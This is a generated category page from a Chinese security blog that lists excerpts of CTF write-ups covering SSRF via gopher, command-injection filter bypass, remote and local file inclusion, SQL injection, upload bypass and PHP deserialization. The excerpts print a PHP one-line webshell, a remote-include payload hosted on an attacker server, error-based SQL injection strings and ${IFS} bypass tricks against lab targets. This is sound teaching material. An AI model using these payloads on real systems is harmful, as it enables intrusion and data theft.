@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><script src="/san-blog/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=san-blog/livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>WriteUp | 东阳的安全笔记</title>
+<meta name="keywords" content="">
+<meta name="description" content="数据安全与网络安全技术分享">
+<meta name="author" content="东阳">
+<link rel="canonical" href="http://localhost:1313/san-blog/categories/writeup/">
+<link crossorigin="anonymous" href="/san-blog/assets/css/stylesheet.cd9298b33628769aa1bc1acebbbfd7aa11ce81dfe03484d479e1907760249a1d.css" integrity="sha256-zZKYszYodpqhvBrOu7/XqhHOgd/gNITUeeGQd2Akmh0=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/san-blog/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/san-blog/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/san-blog/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/san-blog/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/san-blog/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" type="application/rss+xml" href="http://localhost:1313/san-blog/categories/writeup/index.xml" title="rss">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/san-blog/categories/writeup/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script>
+</head>
+<body class="list" id="top">
+    <header class="header">
+    <nav class="header-nav">
+        <div class="logo">
+            <a href="http://localhost:1313/san-blog/" accesskey="h" title="东阳的安全笔记 (Alt + H)">东阳的安全笔记</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" class="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu" class="menu">
+            <li>
+                <a href="http://localhost:1313/san-blog/" title="首页">
+                    <span>首页</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/san-blog/posts/" title="文章">
+                    <span>文章</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/san-blog/tags/" title="标签">
+                    <span>标签</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/san-blog/categories/" title="分类">
+                    <span>分类</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/san-blog/archives/" title="归档">
+                    <span>归档</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main"> 
+<header class="page-header"><nav class="breadcrumbs" role="navigation" aria-label="Breadcrumb">
+            <a href="/san-blog/">Home</a>
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right">
+                <polyline points="9 18 15 12 9 6"></polyline>
+            </svg>
+            <a href="/san-blog/categories/">Categories</a>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+        stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right">
+        <polyline points="9 18 15 12 9 6"></polyline>
+    </svg>
+</nav>
+  <h1>
+    WriteUp
+    <a href="/san-blog/categories/writeup/index.xml" title="RSS" aria-label="RSS">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+        stroke-linecap="round" stroke-linejoin="round" height="23">
+        <path d="M4 11a9 9 0 0 1 9 9" />
+        <path d="M4 4a16 16 0 0 1 16 16" />
+        <circle cx="5" cy="19" r="1" />
+      </svg>
+    </a>
+  </h1>
+</header>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">CTFHub SSRF 实战：Gopher 协议文件上传与工具化利用
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>一、题目信息 平台：CTFHub 分类：Skill / Web / SSRF / 文件上传 考点：SSRF（服务器端请求伪造）、Gopher 协议、multipart/form-data 报文构造、文件上传 题目场景：存在一个 ?url= 参数，服务器会代为请求用户指定的地址。目标 flag.php 限制仅本地访问，且需要 POST 上传一个非空文件。
+二、源码分析 通过 Gopher GET 请求访问 flag.php，拿到源码：
+&lt;?php error_reporting(0); if($_SERVER[&#34;REMOTE_ADDR&#34;] != &#34;127.0.0.1&#34;){ echo &#34;Just View From 127.0.0.1&#34;; return; } if(isset($_FILES[&#34;file&#34;]) &amp;&amp; $_FILES[&#34;file&#34;][&#34;size&#34;] &gt; 0){ echo getenv(&#34;CTFHUB&#34;); exit; } ?&gt; 关键限制 条件 说明 REMOTE_ADDR != 127.0.0.1 外部直接访问被拒绝，必须是本机请求 isset($_FILES[&#34;file&#34;]) 必须是文件上传请求（multipart/form-data） $_FILES[&#34;file&#34;][&#34;size&#34;] &gt; 0 上传的文件不能为空 三、攻击思路 3.1 绕过本地访问限制 和之前的 POST key 题型一样，利用 SSRF 让服务器自己请求自己：
+攻击者 -&gt; ?url=gopher://127.0.0.1:80/_... -&gt; 服务器代为请求 -&gt; flag.php 此时 $_SERVER[&#34;REMOTE_ADDR&#34;] 就是 127.0.0.1，通过第一重验证。
+...</p>
+  </div>
+  <footer class="entry-footer">
+
+<span title='2026-06-09 22:55:00 +0800 CST'>June 9, 2026</span>&nbsp;·&nbsp;<span>3 min</span>&nbsp;·&nbsp;<span>431 words</span>&nbsp;·&nbsp;<span>东阳</span></footer>
+  <a class="entry-link" aria-label="post link to CTFHub SSRF 实战：Gopher 协议文件上传与工具化利用" href="http://localhost:1313/san-blog/posts/ctfhub-ssrf-file-upload-gopher-tool/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">CTFHub SSRF 实战：Gopher 协议构造 POST 请求绕过本地限制
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>一、题目信息 平台：CTFHub 分类：Skill / Web / SSRF 考点：SSRF（服务器端请求伪造）、Gopher 协议、双重 URL 编码、HTTP 报文构造 题目场景：存在一个 ?url= 参数，服务器会代为请求用户指定的地址。目标 flag.php 限制仅本地访问，且需要 POST 提交正确的 key。
+二、SSRF 原理 2.1 什么是 SSRF？ SSRF（Server-Side Request Forgery，服务器端请求伪造）是指攻击者通过服务端应用，向服务端所在网络或本地发起请求的攻击方式。
+在本题中，?url= 参数就是 SSRF 的注入点。服务器接收到用户传入的 URL 后，使用自身的 HTTP Client（如 PHP 的 file_get_contents() 或 curl）去请求该地址，并将结果返回给用户。
+2.2 为什么能访问 127.0.0.1？ 访问控制通常发生在多个层级：
+层级 控制方式 本题情况 网络层 (L3) iptables / 防火墙 未限制回环接口 传输层 (L4) TCP 监听绑定 Apache 绑定 0.0.0.0:80，本地可连 应用层 (L7) PHP 代码逻辑 flag.php 仅检查 $_SERVER[&#39;REMOTE_ADDR&#39;] === &#39;127.0.0.1&#39; 当服务端代码发起请求时，它的身份是服务器进程，出站连接的源地址是 127.0.0.1，因此满足 flag.php 的本地访问控制策略。
+...</p>
+  </div>
+  <footer class="entry-footer">
+
+<span title='2026-06-09 21:43:00 +0800 CST'>June 9, 2026</span>&nbsp;·&nbsp;<span>3 min</span>&nbsp;·&nbsp;<span>585 words</span>&nbsp;·&nbsp;<span>东阳</span></footer>
+  <a class="entry-link" aria-label="post link to CTFHub SSRF 实战：Gopher 协议构造 POST 请求绕过本地限制" href="http://localhost:1313/san-blog/posts/ctfhub-ssrf-gopher-post-exploit/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">命令注入综合过滤绕过实战：从空格到管道的一条龙
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>题目信息 类型：Web / 命令注入（Command Injection） 考点：黑名单过滤绕过、Shell 语法特性、编码与通配符 核心漏洞：exec() 直接拼接用户输入，黑名单过滤存在遗漏 源码分析 题目给了一段典型的命令注入代码，过滤规则逐步加强：
+第一版：只过滤 / if (!preg_match_all(&#34;/\//&#34;, $ip, $m)) { $cmd = &#34;ping -c 4 {$ip}&#34;; exec($cmd, $res); } 分析：只防了斜杠，但命令注入绝大多数情况下根本不需要 /。;id、$(id)、`id` 直接通杀。
+第二版：过滤 | 和 &amp; if (!preg_match_all(&#34;/(\||\&amp;)/&#34;, $ip, $m)) { exec(&#34;ping -c 4 {$ip}&#34;, $res); } 分析：禁了管道和后台执行，但 ; 完全没防，而且 $() 也无需任何分隔符。
+第三版：综合过滤（核心挑战） if (!preg_match_all(&#34;/(\||&amp;|;| |\/|cat|flag|ctfhub)/&#34;, $ip, $m)) { $cmd = &#34;ping -c 4 {$ip}&#34;; exec($cmd, $res); } 黑名单：|、&amp;、;、空格、/、cat、flag、ctfhub
+绕过技巧拆解 1. 空格绕过：${IFS} ${IFS} 是 shell 的内置变量（Internal Field Separator），默认值包含空格、Tab、换行。在命令中可以直接代替空格。
+...</p>
+  </div>
+  <footer class="entry-footer">
+
+<span title='2026-06-09 01:00:00 +0800 CST'>June 9, 2026</span>&nbsp;·&nbsp;<span>2 min</span>&nbsp;·&nbsp;<span>383 words</span>&nbsp;·&nbsp;<span>东阳</span></footer>
+  <a class="entry-link" aria-label="post link to 命令注入综合过滤绕过实战：从空格到管道的一条龙" href="http://localhost:1313/san-blog/posts/command-injection-filter-bypass/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">CTFHub RFI 远程文件包含漏洞利用详解
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>题目信息 类型：Web / 文件包含漏洞 靶场：CTFHub 核心漏洞：远程文件包含（Remote File Inclusion, RFI） 目标：通过 RFI 获取服务器 shell 并读取 flag 隐私声明：本文中所有敏感 IP 地址均已做屏蔽处理，统一替换为 xxx.xxx.xxx.xxx，避免暴露真实目标资产。
+漏洞分析 远程文件包含（RFI）是 PHP 文件包含漏洞的一种高危利用方式。当应用程序使用 include()、require() 等函数加载文件时，如果用户可控的参数未经过严格过滤，攻击者就可以构造恶意 URL，让服务器加载并执行远程服务器上的 PHP 脚本。
+本题的关键利用点：
+页面存在 ?file= 参数，用于指定要包含的文件路径 服务器配置中 allow_url_include 或 allow_url_fopen 开启，允许包含远程 URL 攻击者可以在自己控制的服务器上托管恶意 PHP 代码，通过 ?file=http://xxx.xxx.xxx.xxx:8000/yjh.txt 触发执行 利用步骤 1. 准备恶意payload 在攻击者可控的服务器（IP：xxx.xxx.xxx.xxx，端口：8000）上放置文件 yjh.txt，内容如下：
+&lt;?php system(&#34;cat /flag&#34;); ?&gt; 注意：文件名使用了 .txt 后缀，这是为了绕过部分简单的后缀检测。由于 PHP 的 include() 函数在包含远程文件时会执行其中的 PHP 代码，因此即使后缀是 .txt，其中的 PHP 代码依然会被解析执行。
+2. 发送包含请求 通过 Postman 或浏览器构造请求：
+...</p>
+  </div>
+  <footer class="entry-footer">
+
+<span title='2026-06-06 10:00:00 +0800 CST'>June 6, 2026</span>&nbsp;·&nbsp;<span>1 min</span>&nbsp;·&nbsp;<span>208 words</span>&nbsp;·&nbsp;<span>东阳</span></footer>
+  <a class="entry-link" aria-label="post link to CTFHub RFI 远程文件包含漏洞利用详解" href="http://localhost:1313/san-blog/posts/ctfhub-rfi-shell/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">CTFHub 文件包含实战：利用一句话木马 getshell
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>一、题目信息 平台：CTFHub 分类：Skill / Web / RCE / 文件包含 考点：PHP include 函数、一句话木马、WebShell 连接 题目链接：https://writeup.ctfhub.com/Skill/Web/RCE/5LdE3KFwGi6nxRDrvdB8AY.html
+二、源码分析 进入题目后，直接给出了 PHP 源码：
+&lt;?php error_reporting(0); // 关闭报错显示 if (isset($_GET[&#39;file&#39;])) { // 接收 file 参数 if (strpos($_GET[&#39;file&#39;], &#34;flag&#34;) !== false) { // 如果包含 &#34;flag&#34; 字符串 echo &#34;hack&#34;; // 输出 hack，阻止访问 } else { include($_GET[&#39;file&#39;]); // 否则包含指定文件 } } ?&gt; 逻辑梳理 条件 结果 file 参数包含 &#34;flag&#34; 输出 hack，包含失败 file 参数不含 &#34;flag&#34; 执行 include($file) 核心考点：include() 函数的特性——不检查后缀，直接执行文件中的 PHP 代码。
+三、发现突破口 题目下方有一个提示链接，访问后得到 shell.txt：
+http://&lt;TARGET_IP&gt;:&lt;PORT&gt;/shell.txt 内容是一句话木马：
+&lt;?php eval($_REQUEST[&#39;ctfhub&#39;]);?&gt; 连接密码：ctfhub 原理：eval() 函数将 $_REQUEST[&#39;ctfhub&#39;] 接收到的内容作为 PHP 代码执行 四、解题思路 4.1 include 函数的关键特性 假设 index.php 中执行了：
+...</p>
+  </div>
+  <footer class="entry-footer">
+
+<span title='2026-06-05 23:10:00 +0800 CST'>June 5, 2026</span>&nbsp;·&nbsp;<span>2 min</span>&nbsp;·&nbsp;<span>265 words</span>&nbsp;·&nbsp;<span>东阳</span></footer>
+  <a class="entry-link" aria-label="post link to CTFHub 文件包含实战：利用一句话木马 getshell" href="http://localhost:1313/san-blog/posts/ctfhub-file-inclusion-shell/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">[BUUOJ] SQL COURSE 1
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>题目信息 类型：Web / SQL 注入 靶场：BUUOJ 核心漏洞：报错注入（Error-based SQL Injection） 目标：通过报错注入读取数据库中的 flag 漏洞分析 页面存在 SQL 注入点，输入单引号后数据库返回报错信息。通过 updatexml() 函数构造报错，可以将查询结果带出。
+利用步骤 1. 确认报错注入 构造 payload 测试报错注入是否可行：
+id=1&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1)%23 回显中出现 ~geek~，确认当前数据库名为 geek。
+2. 查表名 从 information_schema.tables 中查询当前库的所有表名：
+id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23 3. 查列名 锁定目标表后，查询表中的列名：
+id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;目标表名&#39;),0x7e),1)%23 4. 读取 flag 拿到列名后，直接查询 flag 字段：
+id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(flag) from 目标表名),0x7e),1)%23 updatexml 的报错输出有长度限制（约 32 字符），如果 flag 较长，需要用 substr() 分段读取。
+...</p>
+  </div>
+  <footer class="entry-footer">
+
+<span title='2026-06-01 22:00:00 +0800 CST'>June 1, 2026</span>&nbsp;·&nbsp;<span>1 min</span>&nbsp;·&nbsp;<span>128 words</span>&nbsp;·&nbsp;<span>东阳</span></footer>
+  <a class="entry-link" aria-label="post link to [BUUOJ] SQL COURSE 1" href="http://localhost:1313/san-blog/posts/buu-sql-course-1/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">[DASCTF] Upload-Labs-Linux Pass-01
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>题目信息 类型：Web / 文件上传漏洞 靶场：Upload-Labs（Pass-01） 核心漏洞：前端 JavaScript 校验绕过，后端无文件类型校验 目标：上传 webshell 到服务器并执行命令获取 flag 靶机地址 http://target/Pass-01/index.php 漏洞分析 1. 前端校验 页面源码中的表单提交时触发 checkFile() 函数：
+function checkFile() { var file = document.getElementsByName(&#39;upload_file&#39;)[0].value; if (file == null || file == &#34;&#34;) { alert(&#34;请选择要上传的文件!&#34;); return false; } // 定义允许上传的文件类型 var allow_ext = &#34;.jpg|.png|.gif&#34;; // 提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(&#34;.&#34;)); // 判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name &#43; &#34;|&#34;) == -1) { var errMsg = &#34;该文件不允许上传，请上传&#34; &#43; allow_ext &#43; &#34;类型的文件,当前文件类型为：&#34; &#43; ext_name; alert(errMsg); return false; } } 关键点：校验只存在于浏览器端 JavaScript，后端 PHP 未对文件类型、后缀、内容做任何校验。
+2. 绕过思路 前端 JS 校验无法阻止直接构造 HTTP 请求。使用 curl 命令直接发送 multipart/form-data POST 请求，完全不经过浏览器页面，即可绕过前端拦截。
+利用步骤 1. 准备 webshell 编写一个最简单的 PHP webshell：
+...</p>
+  </div>
+  <footer class="entry-footer">
+
+<span title='2026-06-01 21:00:00 +0800 CST'>June 1, 2026</span>&nbsp;·&nbsp;<span>1 min</span>&nbsp;·&nbsp;<span>202 words</span>&nbsp;·&nbsp;<span>东阳</span></footer>
+  <a class="entry-link" aria-label="post link to [DASCTF] Upload-Labs-Linux Pass-01" href="http://localhost:1313/san-blog/posts/upload-labs-linux-pass01/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">[0CTF 2016]piapiapia
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>题目信息 类型：Web / PHP 反序列化 核心漏洞：反序列化字符串逃逸 &#43; 任意文件读取 源码泄露：www.zip 源码结构 下载源码后得到以下关键文件：
+文件 作用 index.php 登录页面 register.php 注册页面 update.php 更新个人信息（文件上传 &#43; 数据入库） profile.php 展示个人信息（触发文件读取） class.php 核心类（user &#43; mysql） config.php 配置文件（含 flag） 漏洞分析 1. 任意文件读取（核心利用点） profile.php 第 16 行：
+$profile = unserialize($profile); $photo = base64_encode(file_get_contents($profile[&#39;photo&#39;])); $profile 是从数据库读取的序列化字符串，经过 unserialize() 后得到数组。$profile[&#39;photo&#39;] 作为文件路径传入 file_get_contents()，结果被 base64 编码输出到页面。
+如果能控制 $profile[&#39;photo&#39;] 的值，就能读取服务器上的任意文件。
+2. 反序列化字符串逃逸 2.1 filter() 函数 class.php 中的 filter()：
+public function filter($string) { $escape = array(&#39;\&#39;&#39;, &#39;\\\\&#39;); $escape = &#39;/&#39; . implode(&#39;|&#39;, $escape) . &#39;/&#39;; $string = preg_replace($escape, &#39;_&#39;, $string); $safe = array(&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;); $safe = &#39;/&#39; . implode(&#39;|&#39;, $safe) . &#39;/i&#39;; return preg_replace($safe, &#39;hacker&#39;, $string); } 关键点：
+...</p>
+  </div>
+  <footer class="entry-footer">
+
+<span title='2025-05-30 15:00:00 +0800 CST'>May 30, 2025</span>&nbsp;·&nbsp;<span>3 min</span>&nbsp;·&nbsp;<span>592 words</span>&nbsp;·&nbsp;<span>东阳</span></footer>
+  <a class="entry-link" aria-label="post link to [0CTF 2016]piapiapia" href="http://localhost:1313/san-blog/posts/piapiapia/"></a>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="http://localhost:1313/san-blog/">东阳的安全笔记</a></span> · 
+
+    
+    
+    <span>
+        Powered by
+        <a href="https://gohugo.io/?utm_source=papermod" rel="noopener" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" id="top-link" class="top-link hidden" aria-label="go to top" title="Go to Top (Alt + G)" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+        stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevrons-up">
+        <polyline points="17 11 12 6 7 11"></polyline>
+        <polyline points="17 18 12 13 7 18"></polyline>
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var toplink = document.getElementById("top-link");
+    window.onscroll = function () {
+        const scrollThreshold = window.innerHeight;
+        if (document.body.scrollTop > scrollThreshold || document.documentElement.scrollTop > scrollThreshold) {
+            toplink.classList.remove("hidden");
+        } else {
+            toplink.classList.add("hidden");
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
